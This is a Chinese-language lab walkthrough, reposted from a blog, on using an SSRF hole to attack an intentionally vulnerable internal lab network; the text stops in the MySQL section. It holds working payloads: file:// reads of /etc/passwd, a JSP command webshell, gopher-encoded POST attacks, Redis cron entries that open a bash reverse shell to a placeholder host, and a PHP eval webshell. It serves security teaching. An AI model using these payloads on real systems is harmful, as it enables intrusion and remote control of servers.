> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Zbk8R6Zlqgmy6Dwdw1HeJw)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

 |

经国光师傅同意转发至公众号，已投稿至先知社区，作者原文地址：https://www.sqlsec.com/2021/05/ssrf.html

**前言**

SSRF 以前没有单独总结过相关的姿势点，去年的时候国光就已经写了一大半了，但是后面由于经常赶项目的原因，所以这篇文章就拖延到今天才发布，感觉这个版本还是比较完善的（实际上还有几个坑没有填，但是搞这么细有啥意义呢，真正的内网当中 SSRF 打穿还是很有难度的）。  

**靶场拓扑设计**

首先来看下本次靶场的设计拓扑图：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0AnTWPJlj7UPAqfzic7OicKqia35UBaGMGricCIEkZ5v5BEQEGBIrvdmfeg/640?wx_fmt=png)

先理清一下攻击流程，172.72.23.21 这个服务器的 Web 80 端口存在 SSRF 漏洞，并且 80 端口映射到了公网的 8080，此时攻击者通过这个 8080 端口可以借助 SSRF 漏洞发起对 172 目标内网的探测和攻击。

本场景基本上覆盖了 SSRF 常见的攻击场景，实际上 SSRF 还可以攻击 FTP、Zabbix、Memcached 等应用，由于时间和精力有限，先挖个坑，以后有机会的话再补充完善这套 SSRF 攻击场景的。

**x.x.x.x:8080 - 判断 SSRF 是否存在**

能够对外发起网络请求的地方，就可能存在 SSRF。首先看下目标站点的功能，获取站点快照：  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0vlGgaCsRswI1ibxTxPTP2VqLcpXpicZb3grc9bq0Or2o9UV0MVNYGNWA/640?wx_fmt=png)

先尝试获取外网 URL 试试看，测试一下经典的 百度 robots.txt：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0HUBvxDJRCiahY43ia0ic4bMrURTZX0ROVWIHHKiaJXFB1yOqjkTrcUTbgg/640?wx_fmt=png)

测试成功，网站请求了 Baidu 的 robots.txt 文件了，并将请求页面的内容回显到了网站前端中。那么接下来尝试获取内网 URL 看看，测试请求 127.0.0.1 看看会有什么反应：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0vg5YZShYBQwpdKJIiaVzmMv9V3yibPRw4pP2aYqNYdNiasJCLyGGAbcEw/640?wx_fmt=png)

测试依然成功，网站请求了 127.0.0.1 的 80 端口 ，也就是此可我们浏览的界面，所以我们就看到了图片上的 “套娃” 现象。通过以上两次请求，已经基本上可以确定这个输入框就是传说中的 SSRF 的漏洞点了，即没有对用户的输入进行过滤，导致可以用来发起任意的内网或者外网的请求。

**172.72.23.21 - SSRF 获取本地信息**

**FILE 协议获取本地信息**  

既然当前站点存在 SSRF 的话，我们可以尝试配合 file 协议来读取本地的文件信息，首先尝试使用 file 协议来读取 /etc/passwd 文件试试看：

```
file:///etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0vqKBCYIQFxVk1qDGQ9jUkDqibwQHsW8S8TYSUvyak5MzxgRIfo5aPAw/640?wx_fmt=png)

  

成功读取到了本地的文件信息，现在尝试来获取存在 SSRF 漏洞的本机内网 IP 地址信息，确认当前资产的网段信息：

```
file:///etc/hosts
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0ZGMAKtMAEOzhGqqLs9tBqDd2OVIUh5gpSkHfQgWwTkhxVra1wvbE7g/640?wx_fmt=png)

  

可以判断当前机器的内网地址为 172.23.23.21，那么接下来就可以对这个内网资产段进行信息收集了。

> 权限高的情况下还可以尝试读取 /proc/net/arp 或者 /etc/network/interfaces 来判断当前机器的网络情况

**172.72.23.1/24 - SSRF 探测内网端口**

SSRF 常配合 DICT 协议探测内网端口开放情况，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP 回显的端口，具体可以探测哪些端口需要大家自己动手去测试一下，BP 下使用迭代器模式爆破，设置好要爆破的 IP 和 端口即可批量探测出端口开放的信息：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0nkbKkib7htZuQRemcT78ymcOxQg40f4f8KsznkwKaTVTATdiaKTjO36A/640?wx_fmt=png)

通过爆破可以轻易地整理出端口的开放情况：

```
172.72.23.21 - 80
172.72.23.22 - 80
172.72.23.23 - 80、3306
172.72.23.24 - 80
172.72.23.25 - 80
172.72.23.26 - 8080
172.72.23.27 - 6379
172.72.23.28 - 6379
172.72.23.29 - 3306
```

对照下拓扑图，端口开放信息都是一一匹配的，信息收集完毕，那么接下来就开始只使用最外部的 SSRF 来打穿内网吧。

除了使用 DICT 协议探测端口以外，还可以使用正常的 HTTP 协议获取到内网中 Web 应用的信息情况，这里就不再赘述了。

**172.72.23.22 - 代码注入**

**代码注入应用详情**

本版块属于上帝视角，主要作用是给读者朋友们展示一下应用本身正常的功能点情况，这样后面直接使用 SSRF 来攻击的话，思路就会更加清晰明了。

*   **index.php**
    

一个正常的提示页面，啥都没有：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0FofntIKjvVFVoqsPnsxwsp091V6QDwlxobRLyCKUQITv2ZWGsCSjPg/640?wx_fmt=png)

*   **phpinfo.php**
    

凑数勉强算是一个敏感文件吧：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0hLqHticp0K9pHHapkAe6ibiaN734E9hNsayAhHNmN67U8vpJqMOGGibKwA/640?wx_fmt=png)

*   **shell.php**
    

一个经典的 system 一句话木马：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0q0rGuXYbCmsHGbff0jx4QWK8htDgPoqPUZniclXWWFDWVL03Wj4KqTw/640?wx_fmt=png)

**SSRF 之目录扫描**

如果想要利用 SSRF 漏洞对内网 Web 资产进行目录扫描的话，使用传统的 dirsearch 等工具就不是很方便了，国光在这种场景下使用的是 Burpsuite 抓包，然后导入字典批量遍历路径参数，请求包如下：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0vFyrOZlJMzuxStRicpsFQHlNqH2tH5NS21SQIjicMKbBUhc5NbyRibNiaQ/640?wx_fmt=png)

使用 Burpsuite 自带的 Grep - Extract 可以快速地筛选页面正则匹配的结果，很明显这个 172.72.23.22 的内网站点下面还存在着 phpinfo.php 和 shell.php：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0XA7rfPIY8Txx6Ul8aqRUdrqIrGic0tQFbsiaVE1icgIiaPZaSWR5nEw1aA/640?wx_fmt=png)

**SSRF 之代码注入**

因为这个一句话 webshell 使用了 GET 来接受请求，所以可以直接使用 SSRF 的 HTTP 协议来发起 GET 请求，直接给 cmd 参数传入命令值，导致命令直接执行：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN06lhKNh6glwehSrvB5jLEILxiaByL8icgtUiaTjviaP0OyAVuCNUUtoibI3Q/640?wx_fmt=png)

使用浏览器提交请求的话，空格得写成`%20`才可以顺利执行命令 ：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0VMLxXewXvGkGd4SOl6Ux1CJnqUY4N21PqKdicKSQ8tVfhYU0Ex7aX7g/640?wx_fmt=png)

从 hosts 文件的结果可以看出，当前我们已经拿下了内网 172.72.23.22 这台机器的权限了。

如果从 BP 里面抓包请求的话，空格得写成 %2520，即两次 URL 编码才可以顺利执行命令：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN02m1f3VzLZfJ4C0Re1k46D8ichD5ic2jjxuWL4KewjpqyCBWswiatRzrdg/640?wx_fmt=png)

**172.72.23.23 - SQL 注入**

**SQL 注入应用详情**

本版块属于上帝视角，主要作用是给读者朋友们展示一下应用本身正常的功能点情况，这样后面直接使用 SSRF 来攻击的话，思路就会更加清晰明了。

基础的联合查询注入，可以直接带出数据库的相关信息：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0pFy42ENgTibZ4CFC74QOokzh5wXTXjPhrIFPs1wuAlDibYZ3Tp20TehA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN04YJk7uBsmOHQFJicLCdZ7QlTibmOf0RwCibLdVDJWgDsbzwsvbGWCgzpg/640?wx_fmt=png)

  

同时也预设了一个 flag，同样通过联合查询也可以简单的查询出 flag 的值：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0AH8qE5L4IpwOHmozYVfMicbFiaODeNOeEFib0oibjvk6GHoe59NoBCbcUg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0H5YBZmdkcLo9MTH1DwpKUUYuiaP03iaoQYwICrWpkWZeMiaEmHSmnygWA/640?wx_fmt=png)

  

因为管理员（国光）不小心（故意）给网站目录设置了 777 权限，所以这里可以尝试通过 MySQL 的 `INTO DUMPFILE` 直接往网站的目录下写 shell，最终借助 SQL 注入的 UNION 注入来执行写 shell 的 SQL 语句 payload 如下：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0e2LhGzic2JlvfLrySTQoq1pacVibicDXfGFkpdLbQp7k0F05Okel9QBrA/640?wx_fmt=png)

  

成功写 shell 后，浏览器直接访问执行命令看看：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0ByDBPSrp52tzqEK6muQHJtLrehZ0jKMabR1JibJdzZGkSczxvmqgMAQ/640?wx_fmt=png)

  

**SSRF 之 SQL 注入**

利用 SSRF 来注入内网中存在 SQLI 的资产的话，和上一个小节的 GET 型注入差不多，只要注意一些编码细节即可。

SSRF 之基础的联合查询注入，可以直接带出数据库的相关信息，和正常注入差不多，只需要将空格进行**两次 URL 编码**即可：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0CxTfibJCD05bn1YHicFicqA2jlc5x0icrHQhmgU8eB2NMBmiaNk6k9LrINg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN08f0nNQOo4tB4efBAOF4GbZjYQUbPlLk6F7JenU1mQqrYiaLIyKUnF1g/640?wx_fmt=png)

  

同理直接注入出数据库中的 flag：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN06TDlSs3hZibwzjLBicaP6Lk5xVIWNJMEd424rTq4VBia7bMarpgiaicTicAg/640?wx_fmt=png)

  

往网站的目录写通过 SQL 语句来写 shell：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0RicQe7LTq2669puyw80iaw2Z2Tic8OOQvT0TicCNyWJZ5ibJdqZPP0SyicXQ/640?wx_fmt=png)

  

写入 shell 成功后尝试直接来命令执行：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0DUQKXu5vtv0icK0qdptaicVCjHXv20wkpEwJ7Q1Zacb0icXyloPJMUwibw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN023eXojJfy2o8qcsSaC8XZdKK8icicbMTYs2nJx5feJdEyRMia9LgPia3ww/640?wx_fmt=png)

**172.72.23.24 - 命令执行**

**命令执行应用详情**

本版块属于上帝视角，主要作用是给读者朋友们展示一下应用本身正常的功能点情况，这样后面直接使用 SSRF 来攻击的话，思路就会更加清晰明了。

172.72.23.24 是一个经典的命令执行，通过 POST 方式攻击者可以随意利用 Linux 命令拼接符 ip 参数，从而导致任意命令执行：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0jicEIPN6iboEMibAMwsWTokNjIGfv3p7c0gSBhu1vfribMQqJx7Jh5dqZw/640?wx_fmt=png)

  

**SSRF 之命令执行**

这种场景和之前的攻击场景稍微不太一样，之前的代码注入和 SQL 注入都是直接通过 GET 方式来传递参数进行攻击的，但是这个命令执行的场景是通过 POST 方式触发的，我们无法使用使用 SSRF 漏洞通过 HTTP 协议来传递 POST 数据，这种情况下一般就得利用 gopher 协议来发起对内网应用的 POST 请求了，gopher 的基本请求格式如下：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0M7jPWQ4LuKAIyrM0dlrBDem3oicusHtPm3bTnxEibSbASib1O9YThXdvQ/640?wx_fmt=png)

  

gopher 协议是一个古老且强大的协议，从请求格式可以看出来，可以传递最底层的 TCP 数据流，因为 HTTP 协议也是属于 TCP 数据层的，所以通过 gopher 协议传递 HTTP 的 POST 请求也是轻而易举的。

首先来抓取正常情况下 POST 请求的数据包，删除掉 HTTP 请求的这一行：

```
Accept-Encoding: gzip, deflate
```

> 如果不删除的话，打出的 SSRF 请求会乱码，因为被两次 gzip 编码了。

接着在 Burpsuite 中将本 POST 数据包进行两次 URL 编码：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0gpPJzI1QUKIZxt9UMbVQFjHb9gQUt0EMuGl7NCA3jPEw6Ficbf8dkow/640?wx_fmt=png)

  

两次 URL 编码后的数据就最终的 TCP 数据流，最终 SSRF 完整的攻击请求的 POST 数据包如下：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0dxEGBiaGbMgsPjGmBiaxVS4GTtOflwiaQGTRuRKK8ma0ebzcKRnEicfPzw/640?wx_fmt=png)

  

可以看到通过 SSRF 成功攻击了 172.72.23.24 的命令执行 Web 应用，顺利执行了`cat /etc/hosts`的命令：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0NzwNsmeeDtIEr7PK6Fcnib9WxZOzjMo7rLIS9BEWy16X06ia7ggWLXcA/640?wx_fmt=png)

  

**172.72.23.25 - XML 实体注入**

**XXE 应用详情**

本版块属于上帝视角，主要作用是给读者朋友们展示一下应用本身正常的功能点情况，这样后面直接使用 SSRF 来攻击的话，思路就会更加清晰明了。

本场景是一个基础的 XXE 外部实体注入场景，登录的时候用户提交的 XML 数据，且服务器后端对 XML 数据解析并将结果输出，所以可以构造一个 XXE 读取本地的敏感信息：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0KzJ6CQGxgkFuCJof9G25HelVI8TAX0micZ6nA3XqtZ6Bae9veHX3ZOw/640?wx_fmt=png)

  

下面是 XXE 攻击的效果图：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0LsLBQbnIITziaB2DiayPsWwxGZxxFLcmbyvwZpA7qR4kqVOSZFvIreCA/640?wx_fmt=png)

  

**SSRF 之 XXE**

和上一个场景 172.72.23.24 的命令执行类似，这里 XXE 也是通过在 POST 数据包里面构造 Payload 来进行攻击的，所以依然先来抓取正常情况下 XXE 攻击的 POST 请求的数据包，删除掉 `Accept-Encoding` 这一行，然后使用 Burpsuite 对 POST 数据包进行两次 URL 编码：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN00Ix7dKomWHI9Ib5StUx4D73Pa7cTvggMk6vwBwSSju00fmQBOEoicdQ/640?wx_fmt=png)

  

两次 URL 编码后的数据就最终的 TCP 数据流，最终 SSRF 完整的攻击请求的 POST 数据包如下：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0UrBIQceMic7m1B41UjcibhlyU5dQVFNX3lfJLUML7A0A305yVDXptCZQ/640?wx_fmt=png)

  

可以看到通过 SSRF 成功攻击了 172.72.23.25 的 XXE Web 应用，顺利执行了 `cat /etc/hosts` 的命令：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0jDDAzICwVAiaLbISBLUVTvunxAkFkCs5Qd7MlsQ2wicJnVqmeJjcU70g/640?wx_fmt=png)

  

**172.72.23.1/24 - SSRF 探测内网端口**

**Tomcat 应用详情**

本场景是一个 Tomcat 中间件，存在 CVE-2017-12615 任意写文件漏洞，这在 Tomcat 漏洞历史中也是比较经典第一个，国光这里不再赘述，没有复现的同学可以参考 vulhub 的靶场来复现次漏洞：Tomcat PUT 方法任意写文件漏洞（CVE-2017-12615）

**SSRF 之 CVE-2017-12615**

和之前的场景类似，国光这里不再赘述了，所以这部分写的比较简略一些。准备一个 JSP 一句话：

```
<%
    String command = request.getParameter("cmd");
    if(command != null)
    {
        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1)
        {
            out.println(new String(b));
        }
        out.print("</pre>");
    } else {
        out.print("format: xxx.jsp?cmd=Command");
    }
%>
```

将原本攻击的 POST 数据包：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0ibhAuMRuia7TISTmFOiaBGiasUv0XIeib5oOibhrurttuceLFSTJKMg8g9ibw/640?wx_fmt=png)

将个 POST 请求二次 URL 编码，最后通过 SSRF 发起这个 POST 请求，返回 201 状态码表示成功写 shell：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0ZL6qmcDIzPApb7lmEnuPr9ApvrwMIUjHOVAkbMZOw5L9uA7HiahDx0Q/640?wx_fmt=png)  

接着通过 SSRF 发起对 shell.jsp 的 HTTP 请求，成功执行了 `cat /etc/hosts` 的命令：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0OTTDicdcSbEjlyIAZhoenhNwr7zLKLRCCiaDgicCZmoogLVtl4emTELJQ/640?wx_fmt=png)

**172.72.23.27 - Redis 未授权**

**Redis unauth 应用详情**

内网的 172.72.23.27 主机上的 6379 端口运行着未授权的 Redis 服务，系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），所以这里攻击思路只能是使用定时任务来进行攻击了。常规的攻击思路的主要命令如下：

```
# 清空 key
flushall

# 设置要操作的路径为定时任务目录
config set dir /var/spool/cron/

# 设置定时任务角色为 root
config set dbfilename root

# 设置定时任务内容
set x "\n* * * * * /bin/bash -i >& /dev/tcp/x.x.x.x/2333 0>&1\n"

# 保存操作
save
```

**SSRF 之 Redis unauth**

SSRF 攻击的话并不能使用 redis-cli 来连接 Redis 进行攻击操作，未授权的情况下可以使用 dict 或者 gopher 协议来进行攻击，因为 gopher 协议构造比较繁琐，所以本场景建议直接使用 DICT 协议来攻击，效率会高很多，DICT 协议除了可以探测端口以外，另一个奇技淫巧就是攻击未授权的 Redis 服务，格式如下：

```
dict://x.x.x.x:6379/<Redis 命令>
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0rPjSD8QsHibviaSOibsxOvqrko4ibPx8ReasG6arDPic2qeQ3hcwGKgNxRQ/640?wx_fmt=png)

通过 SSRF 直接发起 DICT 请求，可以成功看到 Redis 返回执行完 info 命令后的结果信息，下面开始直接使用 dict 协议来创建定时任务来反弹 Shell：

```
# 清空 key
dict://172.72.23.27:6379/flushall

# 设置要操作的路径为定时任务目录
dict://172.72.23.27:6379/config set dir /var/spool/cron/

# 在定时任务目录下创建 root 的定时任务文件
dict://172.72.23.27:6379/config set dbfilename root

# 写入 Bash 反弹 shell 的 payload
dict://172.72.23.27:6379/set x "\n* * * * * /bin/bash -i >%26 /dev/tcp/x.x.x.x/2333 0>%261\n"

# 保存上述操作
dict://172.72.23.27:6379/save
```

> SSRF 传递的时候记得要把 & URL 编码为 %26，上面的操作最好再 BP 下抓包操作，防止浏览器传输的时候被 URL 打乱编码

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0GV7YAzpukIV8jIhNhicnicLcSCvoNKgESjOvvibRuicVWfnia2icWyDEKllA/640?wx_fmt=png)

在目标系统上创建定时任务后，shell 也弹了出来，查看下 `cat /etc/hosts` 的确是 172.72.23.27 这台内网机器：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0NmqhfIfnBgiaftKWBus0c0RBOUXcT9TSvnDk5n7BNAhsKvQCCcAoncQ/640?wx_fmt=png)

**172.72.23.28 - Redis 有认证**

**Redis auth 应用详情**

本版块属于上帝视角，主要作用是给读者朋友们展示一下应用本身正常的功能点情况，这样后面直接使用 SSRF 来攻击的话，思路就会更加清晰明了。

该 172.72.23.28 主机运行着 Redis 服务，但是有密码验证，无法直接未授权执行命令：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0q1b9eKdYHhm6eWzpxXTtChlsnL41YibD5Ayysf0fzcJgI6WWhmvw4xg/640?wx_fmt=png)

  

不过除了 6379 端口还开放了 80 端口，是一个经典的 LFI 本地文件包含，可以利用此来读取本地的文件内容：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0cOmAX2Urg7ZibaWzfdFocpJnvZ9nBvuJN2lCRgaQAiaVpOg5L11zwosA/640?wx_fmt=png)

  

因为 Redis 密码记录在 redis.conf 配置文件中，结合这个文件包含漏洞点，那么这时来尝试借助文件包含漏洞来读取 redis 的配置文件信息，Redis 常见的配置文件路径如下：

```
/etc/redis.conf
/etc/redis/redis.conf
/usr/local/redis/etc/redis.conf
/opt/redis/ect/redis.conf
```

  

成功读取到 `/etc/redis.conf` 配置文件，直接搜索 `requirepass`关键词来定位寻找密码：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0LLiaQbFxM9Ej6RxNGecf0TxX6ohgLa0QFefzibocCv8uXwZ0dqib63SibA/640?wx_fmt=png)

  

拿到密码的话就可以正常和 Redis 进行交互了：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0Q1KicGmxxvqWQg91Ec4xF2bcm5c1t2Na7N6nvgUvAlZic6bNuxiczI4Dw/640?wx_fmt=png)

  

**SSRF 之 Redis auth**
---------------------

首先借助目标系统的 80 端口上的文件包含拿到 Redis 的密码：P@ssw0rd

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0GKlibGmb4rbQ6TbZALoia3957WUgCxGzhULOniavnGTcjTWfgB05LREDQ/640?wx_fmt=png)

  

有密码的话先使用 dict 协议进行密码认证看看：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0X28tcnpyCEqyia63Sic3lL1dlYiaIbmHCUNVicha7gBQ1LlBQOB4ibwnkpQ/640?wx_fmt=png)

  

但是因为 dict 不支持多行命令的原因，这样就导致认证后的参数无法执行，所以 dict 协议理论上来说是没发攻击带认证的 Redis 服务的。

那么只能使用我们的老伙计 gopher 协议了，gopher 协议因为需要原生数据包，所以我们需要抓取到 Redis 的请求数据包。可以使用 Linux 自带的 socat 命令来进行本地的模拟抓取：

命令来进行本地的模拟抓取：

```
socat -v tcp-listen:4444,fork tcp-connect:127.0.0.1:6379
```

  

此时使用 redis-cli 连接本地的 4444 端口：

```
➜  ~ redis-cli -h 127.0.0.1 -p 4444
127.0.0.1:4444>
```

  

服务器接着会把 4444 端口的流量接受并转发给服务器的 6379 端口，然后认证后进行往网站目录下写入 shell 的操作：

```
# 认证 redis
127.0.0.1:4444> auth P@ssw0rd
OK

# 清空 key
127.0.0.1:4444> flushall

# 设置要操作的路径为网站根目录
127.0.0.1:4444> config set dir /var/www/html

# 在网站目录下创建 shell.php 文件
127.0.0.1:4444> config set dbfilename shell.php

# 设置 shell.php 的内容
127.0.0.1:4444> set x "\n<?php eval($_GET[1]);?>\n"

# 保存上述操作
127.0.0.1:4444> save
```

  

与此同时我们还可以看到详细的数据包情况，下面来记录一下关键的流量情况：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0gDAsEo9ibyRHa3UIu6DzXNgq32icVOlIuwrAmsPD7gGTLty0hkGn5Axg/640?wx_fmt=png)

  

可以看到 Redis 的流量并不难理解，可以根据上图橙色标记的注释来理解一下，接下来整理出关键的请求数据包如下：

```
*2\r
$4\r
auth\r
$8\r
P@ssw0rd\r
*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$13\r
/var/www/html\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$1\r
x\r
$25\r

\r
*1\r
$4\r
save\r
```

  

可以看到每行都是以`\r`结尾的，但是 Redis 的协议是以 CRLF (`\r\n`) 结尾，所以转换的时候需要把`\r`转换为`\r\n`，然后其他全部进行 两次 URL 编码，这里借助 BP 就很容易解决：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0aXERNstQaMU58ffpPpJU9Rh6N8Mz7t3uGqsdCdmWme25JrTYKxmZOw/640?wx_fmt=png)

  

最后放到 SSRF 的漏洞点进行请求：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN01Z18cOUIpSMAhjspOV02qIWRFzae9UguqFQsUvKIB5SMic5jAWjs79A/640?wx_fmt=png)

  

执行成功的话会在 /var/www/html 根目录下写入 shell.php 文件，密码为 1，那么下面借助 SSRF 漏洞来试试看：

```
http://172.23.23.28/shell.php?1=phpinfo();
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0rb8d3QEtpRv7KZibf3cRydPhDiar4wQqnRGFqiaaxUlTa37QZpCh65jMA/640?wx_fmt=png)

  

成功 getshell，那么消化吸收一下，下面尝试使用 SSRF 来攻击 MySQL 服务吧。

  

**172.72.23.29 - MySQL 未授权**

**MySQL 应用详情**

MySQL 空密码可以登录，靶场在数据库下和系统下各放了一个 flag，通过 SSRF 可以和数据库进行交互，SSRF 进行 UDF 提权可以拿到系统下的 flag：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0ziaZV07tIkt3080cI7qXcGezyCs1fT1OPs8iaz25SjZWlOaveqiaqP61A/640?wx_fmt=png)

  

**SSRF 之 MySQL 未授权**

**获取原始数据包**

MySQL 需要密码认证时，服务器先发送 salt 然后客户端使用 salt 加密密码然后验证；但是当无需密码认证时直接发送 TCP/IP 数据包即可。所以这种情况下是可以直接利用 SSRF 漏洞攻击 MySQL 的。因为使用 gopher 协议进行攻击需要原始的 MySQL 请求的 TCP 数据包，所以还是和攻击 Redis 应用一样，这里我们使用 tcpdump 来监听抓取 3306 的认证的原始数据包：

```
# lo 回环接口网卡 -w 报错 pcapng 数据包
tcpdump -i lo port 3306 -w mysql.pcapng
```

  

然后本地使用 MySQL 来执行一些测试命令：

```
$ mysql -h127.0.0.1 -uroot -e "select * from flag.test union select user(),'www.sqlsec.com';"
+----------------+----------------------------------------+
| id             | flag                                   |
+----------------+----------------------------------------+
| 1              | flag{71***************************316} |
| root@127.0.0.1 | www.sqlsec.com                         |
+----------------+----------------------------------------+
```

  

中止 tcpdump 使用 Wireshark 打开 `mysql.pcapng` 数据包，追踪 TCP 流 然后过滤出发给 3306 的数据：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN02FxPOibCrSpv9BvS76Efm0K3kwEZkQnwtibfvIlooITVfzsgmygp5gtQ/640?wx_fmt=png)

  

保存为原始数据「Show data as `Raw`」，并且整理成 1 行：

```
a100000185a23f0000000001080000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033530380f5f636c69656e745f76657273696f6e06352e362e3531095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420313d0000000373656c656374202a2066726f6d20666c61672e7465737420756e696f6e2073656c656374207573657228292c277777772e73716c7365632e636f6d270100000001
```

  

**生成 gopher 数据流**

然后使用如下的 Python3 脚本将数据转化为 url 编码：

```
import sys

def results(s):
    a=[s[i:i+2] for i in range(0,len(s),2)]
    return "curl gopher://127.0.0.1:3306/_%"+"%".join(a)

if __name__=="__main__":
    s=sys.argv[1]
    print(results(s))
```

  

